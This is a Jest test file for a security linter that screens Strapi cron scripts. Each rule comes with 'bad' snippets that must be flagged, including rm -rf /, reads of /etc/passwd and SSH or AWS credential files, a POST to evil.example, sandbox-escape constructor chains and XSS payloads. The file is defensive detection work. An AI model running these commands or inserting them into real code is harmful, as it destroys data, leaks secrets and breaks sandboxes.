import { checkScript } from '../engine';
import { rules } from '../rules';
import type { CheckOptions } from '../types';

const ruleIds = (source: string, options?: CheckOptions) =>
  checkScript(source, undefined, options).findings.map((finding) => finding.ruleId);

const markdownOptions: CheckOptions = { markdownFields: ['rawHtml', 'description'] };

/** For every rule: scripts that must trigger it and scripts that must not. */
const cases: Record<string, { bad: string[]; good: string[]; options?: CheckOptions }> = {
  'no-insecure-transport': {
    bad: [
      "const FEED = 'http://37.32.12.50/v1/blocks.json';",
      "await fetch('http://feed.example.com/x')",
      'const url = `http://${host}/feed`;',
      "new WebSocket('ws://feed.example.com')",
      "const u = '  HTTP://EXAMPLE.COM';",
      "const html = '<img src=\"http://cdn.example.com/a.png\">';",
      "const html = '<a href=http://example.com>x</a>';",
    ],
    good: [
      "await fetch('https://feed.example.com/x')",
      "new WebSocket('wss://feed.example.com')",
      "const svg = '<svg xmlns=\"http://www.w3.org/2000/svg\"></svg>';",
      "const ns = 'http://www.w3.org/1999/xhtml';",
      "const text = 'see http docs';",
    ],
  },
  'no-unsafe-markup': {
    bad: [
      "const html = '<script>alert(1)</script>';",
      "const html = '<div><style>main{display:none}</style></div>';",
      'const html = `<iframe src="https://x"></iframe>`;',
      "const html = '<SCRIPT src=x>';",
      "const html = '< object data=x>';",
      "const html = '<link rel=stylesheet href=https://x>';",
      "const html = '<meta http-equiv=refresh content=0>';",
      "const html = '<base href=https://x>';",
      "const html = '<form action=https://x><input name=q></form>';",
      "const html = '<img src=x onerror=alert(1)>';",
      "const html = '<div style=\"color:red\">x</div>';",
      "const html = '<a href=\"javascript:alert(1)\">x</a>';",
      "const url = 'data:text/html,<b>x</b>';",
      "const html = '\\u003cscript>';",
    ],
    good: [
      "const html = '<table><tr><td>1</td></tr></table>';",
      "const html = '<p class=\"lead\">Hello <strong>world</strong></p>';",
      "const text = 'description of the style guide';",
      "const html = '<a href=\"https://snapp.ir\" rel=\"noopener\">x</a>';",
      "const html = '<scripture>';",
      'const pattern = /<script/i;',
    ],
  },
  'no-unlisted-content-types': {
    options: { allowedContentTypes: ['api::landing.landing'] },
    bad: [
      "await strapi.db.query('api::landing.landing').findMany()",
      "await strapi.db.query('plugin::strapi-plugin-cron.cron-job').findMany({ select: ['script'] })",
      "await strapi.documents('plugin::upload.file').findMany()",
      "await strapi.documents('admin::user').findMany()",
      'await strapi.documents(uid).findMany()',
      "await strapi.documents(`api::${name}.${name}`).findMany()",
      "await strapi.entityService.findMany('api::landing.landing')",
      "strapi.service('api::landing.landing').find()",
      "strapi.plugin('upload').service('upload')",
      'strapi.config.get("server")',
      "strapi['d' + 'b'].query('x')",
      'const docs = strapi.documents;',
      'const s = strapi;',
      'helper(strapi);',
      'const deps = { strapi };',
      'const { db } = strapi;',
    ],
    good: [
      "await strapi.documents('api::landing.landing').findMany({ filters: { domain: 'food' } })",
      "await strapi.documents('api::landing.landing').update({ documentId: 'a', data: {} })",
      "await strapi.documents(\"api::landing.landing\").publish({ documentId: 'a' })",
      "strapi.log.info('done')",
      'const strapiLike = 1;',
    ],
  },
  'no-dynamic-markup': {
    options: markdownOptions,
    bad: [
      'await strapi.documents("api::landing.landing").update({ documentId, data: { rawHtml: feed.blocks[id] } });',
      'const c2 = Object.assign({}, c, { rawHtml: html });',
      'const c2 = { ...c, rawHtml };',
      'component.rawHtml = html;',
      'component.rawHtml += html;',
      "const c2 = { 'rawHtml': html };",
      'const c2 = { rawHtml: `<td>${price}</td>` };',
      "const c2 = { rawHtml: '<td>' + price + '</td>' };",
      'const c2 = { description: c.rawHtml.replace(old, price) };',
      'const c2 = { rawHtml: feed.html.slice(0) };',
      'const escapeHtml = (s) => s;',
      'function escapeHtml(s) { return s; }',
      'const f = (escapeHtml) => escapeHtml;',
      'escapeHtml = (s) => s;',
    ],
    good: [
      "const c2 = { rawHtml: '<table><tr><td>1</td></tr></table>' };",
      'const c2 = { rawHtml: `<td>${escapeHtml(price)}</td>` };',
      "const c2 = { rawHtml: '<td>' + escapeHtml(price) + '</td>' };",
      'const c2 = { rawHtml: c.rawHtml.replace(/\\d+/, escapeHtml(price)) };',
      "const c2 = { rawHtml: String(c.rawHtml || '').replaceAll('{{price}}', escapeHtml(price)) };",
      'const c2 = { rawHtml: ok ? `<b>${escapeHtml(a)}</b>` : null };',
      'const c2 = { ...c, price: feed.price, title: feed.title };',
      'component.price = feed.price;',
    ],
  },
  'no-child-process': {
    bad: [
      "const cp = require('child_process');",
      "await import('node:child_process')",
      "const name = 'child' + '_process'; const m = 'child_process';",
      "process.binding('spawn_sync')",
      "exec('rm -rf /')",
      "execSync('id')",
      "spawn('sh', ['-c', 'id'])",
      "spawnSync('ls')",
      "fork('./worker.js')",
      "cp.execFileSync('/bin/sh')",
      'cp.spawn(cmd)',
      'const run = execSync;',
      'const { exec } = mod;',
    ],
    good: ['const match = /a/.exec(text);', 'pattern.exec(value)', 'const execution = 1;', 'const o = { spawn: 1 };'],
  },
  'no-native-modules': {
    bad: [
      "require('./build/Release/addon.node')",
      "const file = 'addon.node';",
      "require('ffi-napi')",
      "await import('ffi')",
      "require('bindings')('addon')",
      "const gyp = 'node-gyp';",
      "require('@mapbox/node-pre-gyp')",
      "require('koffi')",
      'process.dlopen(module, file)',
      'loader.dlopen(path)',
    ],
    good: ["strapi.documents('api::tree.node').findMany()", "const label = 'bindings are fine in prose';", "const node = 'x';"],
  },
  'no-filesystem-access': {
    bad: [
      "const f = '/etc/passwd';",
      "const key = '/root/.ssh/id_rsa';",
      "const p = `/var/lib/app`;",
      "const p = '../../.env';",
      "const p = 'uploads/../../config';",
      "const p = 'C:/Windows/System32';",
      "const p = '~/.aws/credentials';",
      "const p = 'file:///etc/hosts';",
      'console.log(__dirname)',
      'const f = __filename;',
      "fs.writeFileSync('notes.txt', data)",
      "fs.symlinkSync('/tmp/a', 'b')",
      'handle.readFile(name)',
      "fsp.unlink('x')",
      'x.createWriteStream(target)',
    ],
    good: [
      "strapi.documents('api::article.article').findMany({ filters: { url: { $startsWith: '/uploads/' } } })",
      "const route = '/api/articles';",
      "const text = 'Loading..';",
      "const ellipsis = '...';",
      "const path = 'a/b/c';",
      'obj.open()',
    ],
  },
  'no-dangerous-modules': {
    bad: [
      "const cp = require('child_process');",
      "require('node:fs').readFileSync('/etc/passwd')",
      'const http = require(`https`);',
      "await import('vm')",
      "await import('node:worker_threads')",
    ],
    good: ["const s = 'child_process';", "await strapi.documents('api::fs.fs').findMany()"],
  },
  'no-dynamic-module-loading': {
    bad: [
      "require('lodash')",
      "module.require('lodash')",
      "createRequire(here)('x')",
      "module.constructor._load('x')",
      "require('/app/node_modules/lodash')",
      'require(name)',
      'const r = require; r("x")',
      'await import(moduleName)',
      "await import('lodash')",
    ],
    good: ['const required = true;', 'obj.require("x")', 'const o = { require: 1 }'],
  },
  'no-code-evaluation': {
    bad: [
      "eval('1+1')",
      'globalThis.eval(code)',
      "new Function('return this')()",
      "Function('return process')()",
      "setTimeout('doEvil()', 10)",
      'setInterval(`x()`, 10)',
      'const e = eval; e(code)',
      "Function.constructor('return process')()",
      "Function.prototype.constructor('x')",
      'const F = Function; F(code)',
      'const AsyncFn = (async () => {}).constructor;',
      'const G = Object.getPrototypeOf(function* () {}).constructor;',
      'vm.runInContext(code, ctx)',
      'vm.runInNewContext(code)',
      'runInThisContext(code)',
      "new vm.Script('1')",
      'vm.compileFunction(body)',
    ],
    good: [
      'setTimeout(() => console.log(1), 10)',
      'const evaluation = 1;',
      'obj.eval("x")',
      'class A { eval() {} }',
      'if (fn instanceof Function) {}',
      'const c = item.constructor;',
      'Function.prototype.call.bind(fn)',
    ],
  },
  'no-process-access': {
    bad: [
      'process.env.DATABASE_PASSWORD',
      'process.exit(1)',
      "process.mainModule.require('child_process')",
      'const p = process;',
      'globalThis.process.env',
      'global.process.kill(1)',
      'const o = { process };',
      'process.binding("fs")',
      'process.dlopen(m, f)',
      'globalThis.process.exit(0)',
    ],
    good: ['const processed = 1;', 'item.process()', 'const o = { process: 1 };'],
  },
  'no-global-tampering': {
    bad: [
      'globalThis.foo = 1',
      'global.fetch = () => {}',
      'Array.prototype.map = null',
      'Object.prototype.polluted = true',
      'strapi.documents = () => null',
      'strapi.foo++',
      'delete strapi.db',
      'console.log = () => {}',
      'Object.defineProperty(globalThis, "x", { value: 1 })',
      'Object.assign(strapi, { x: 1 })',
      'Reflect.set(global, "x", 1)',
      'x.__proto__.y = 1',
    ],
    good: [
      'const data = {}; data.value = 1;',
      'cronJob.note = "x"',
      'Object.assign({}, cronJob)',
      'let count = 0; count++;',
      'Object.defineProperty(target, "x", { value: 1 })',
    ],
  },
  'no-prototype-escape': {
    bad: [
      "''.constructor.constructor('return process')()",
      "(()=>{}).constructor('return this')()",
      "(function(){}).constructor('x')()",
      'obj.__proto__',
      "x['constructor']['constructor']('code')",
    ],
    good: ['const c = item.constructor;', 'if (value.constructor === Object) {}'],
  },
  'no-raw-database': {
    bad: [
      'await strapi.db.connection.raw("select * from admin_users")',
      'const knexInstance = strapi.db.connection;',
      'await db.raw("drop table x")',
      'knex("admin_users").select()',
    ],
    good: [
      "await strapi.db.query('api::article.article').findMany()",
      'const rawValue = data.rawValue;',
    ],
  },
  'no-strapi-internals': {
    bad: [
      "strapi.config.get('admin.auth.secret')",
      'strapi.admin.services.user.findOne(1)',
      'strapi.server.routes([])',
      'await strapi.destroy()',
      'strapi.reload()',
      'strapi.container.get("x")',
      "strapi['config'].get('x')",
      'strapi.dirs.app.root',
    ],
    good: [
      "await strapi.documents('api::article.article').findMany()",
      'strapi.log.info("hi")',
      "strapi.plugin('upload').service('upload')",
    ],
  },
  'no-sensitive-services': {
    bad: [
      "strapi.service('admin::user').create({})",
      "strapi.query('admin::api-token').findMany()",
      "strapi.documents('plugin::users-permissions.user').findMany()",
      "strapi.plugin('users-permissions').service('jwt')",
      "strapi.db.query('admin::user').findMany()",
      "strapi.entityService.findMany('admin::role')",
      "strapi.service(`admin::transfer-token`)",
    ],
    good: [
      "strapi.documents('api::article.article').findMany()",
      "strapi.service('api::admin-note.admin-note')",
      "strapi.plugin('upload')",
    ],
  },
  'no-obfuscation': {
    bad: [
      `const payload = '${'QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVphYmNkZWZnaGlqa2xtbm9wcXJzdHV2d3h5ejAxMjM0NTY3ODk'.repeat(3)}';`,
      `const hex = '${'deadbeef'.repeat(10)}';`,
      "const s = '\\x72\\x65\\x71\\x75\\x69\\x72\\x65';",
      'const t = `\\u0070\\u0072\\u006f\\u0063\\u0065\\u0073\\u0073`;',
      `const t = \`${'deadbeef'.repeat(10)}\`;`,
      'String.fromCharCode(112, 114, 111)',
      "atob('cHJvY2Vzcw==')",
      "Buffer.from(data, 'base64')",
    ],
    good: [
      "const message = 'Hello world, this is a normal sentence that is fairly long but fine.';",
      "const id = 'abc123';",
      "Buffer.from('text', 'utf8')",
      'const n = 42;',
    ],
  },
  'no-dynamic-property-access': {
    bad: ['strapi[name]', 'globalThis[key]()', 'strapi.service(serviceName)', 'this[prop]'],
    good: ["strapi['log'].info('x')", 'items[index]', "strapi.service('api::a.a')"],
  },
  'no-infinite-loops': {
    bad: ['while (true) { console.log(1) }', 'for (;;) {}', 'do { x++ } while (1)', 'while (!0) {}'],
    good: [
      'while (true) { if (done) break; }',
      'for (;;) { return; }',
      'while (true) { throw new Error("x") }',
      'outer: while (true) { for (;;) { break outer; } }',
      'for (let i = 0; i < 10; i++) {}',
      'while (queue.length) { queue.pop() }',
      'while (true) { switch (x) { case 1: break; } if (y) return; }',
    ],
  },
  'no-network-calls': {
    bad: [
      "await fetch('https://evil.example', { method: 'POST' })",
      "new WebSocket('wss://x')",
      'globalThis.fetch(url)',
      "await strapi.fetch('https://example.com')",
      "new XMLHttpRequest()",
      "new EventSource('https://x')",
      "navigator.sendBeacon('https://x', data)",
      'const f = fetch; await f(url)',
      'const f = globalThis.fetch;',
      "await fetch(`https://gateway.internal/${path}`)",
    ],
    good: ['await strapi.documents("api::a.a").findMany()', 'api.fetchData()', 'const o = { fetch: 1 };'],
  },
  'no-bulk-deletes': {
    bad: [
      "await strapi.documents('api::a.a').deleteMany({})",
      "for (const item of items) { await strapi.documents('api::a.a').delete({ documentId: item.documentId }) }",
      "items.forEach((item) => strapi.documents('api::a.a').delete({ documentId: item.id }))",
    ],
    good: [
      "await strapi.documents('api::a.a').delete({ documentId: 'abc' })",
      'map.delete(key)',
    ],
  },
  'no-self-modification': {
    bad: [
      "strapi.documents('plugin::strapi-plugin-cron.cron-job').update({})",
      "strapi.plugin('strapi-plugin-cron')",
      'strapi.documents(`plugin::strapi-plugin-cron.cron-job`)',
    ],
    good: ["strapi.documents('api::article.article')"],
  },
  'no-deprecated-apis': {
    bad: ["await strapi.entityService.findMany('api::a.a')"],
    good: ["await strapi.documents('api::a.a').findMany()"],
  },
};

describe('security rules', () => {
  it('has test cases for every registered rule', () => {
    expect(Object.keys(cases).sort()).toEqual(rules.map((rule) => rule.id).sort());
  });

  it('has unique rule ids and complete metadata', () => {
    const ids = rules.map((rule) => rule.id);
    expect(new Set(ids).size).toBe(ids.length);
    for (const rule of rules) {
      expect(['error', 'warning']).toContain(rule.severity);
      expect(rule.description.length).toBeGreaterThan(10);
      expect(rule.rationale.length).toBeGreaterThan(20);
    }
  });

  for (const rule of rules) {
    describe(rule.id, () => {
      const { bad, good, options } = cases[rule.id] ?? { bad: [], good: [] };

      it.each(bad)('flags: %s', (source) => {
        const result = checkScript(source, undefined, options);
        const findings = result.findings.filter((finding) => finding.ruleId === rule.id);
        expect(findings.length).toBeGreaterThan(0);
        expect(findings.every((finding) => finding.severity === rule.severity)).toBe(true);
      });

      it.each(good)('allows: %s', (source) => {
        expect(ruleIds(source, options)).not.toContain(rule.id);
      });
    });
  }
});

describe('no-unlisted-content-types without allowedContentTypes', () => {
  it('does nothing until a list is configured, and denies everything with an empty list', () => {
    const script = "await strapi.db.query('plugin::upload.file').findMany()";
    expect(ruleIds(script)).not.toContain('no-unlisted-content-types');
    const empty = checkScript("await strapi.documents('api::landing.landing').findMany()", undefined, {
      allowedContentTypes: [],
    });
    expect(empty.findings[0]).toMatchObject({
      ruleId: 'no-unlisted-content-types',
      message: expect.stringContaining('Allowed content types: none'),
    });
  });
});

describe('no-dynamic-markup without markdownFields', () => {
  it('does nothing until fields are configured', () => {
    expect(ruleIds('const c2 = { rawHtml: feed.html };')).not.toContain('no-dynamic-markup');
  });
});

describe('realistic clean scripts', () => {
  const scripts = [
    `const drafts = await strapi.documents('api::article.article').findMany({
  filters: { publishedAt: { $null: true } },
});
console.log(\`Found \${drafts.length} drafts\`);
for (const draft of drafts) {
  if (new Date(draft.scheduledAt) <= new Date()) {
    await strapi.documents('api::article.article').publish({ documentId: draft.documentId });
  }
}`,
    `const expired = await strapi.db.query('api::promo.promo').findMany({ where: { endsAt: { $lt: new Date() } } });
await Promise.all(expired.map((promo) => strapi.documents('api::promo.promo').update({ documentId: promo.documentId, data: { active: false } })));
strapi.log.info('done');`,
    `resolve();`,
  ];

  it.each(scripts)('passes without findings', (script) => {
    const result = checkScript(script);
    expect(result.findings).toEqual([]);
    expect(result.passed).toBe(true);
  });
});
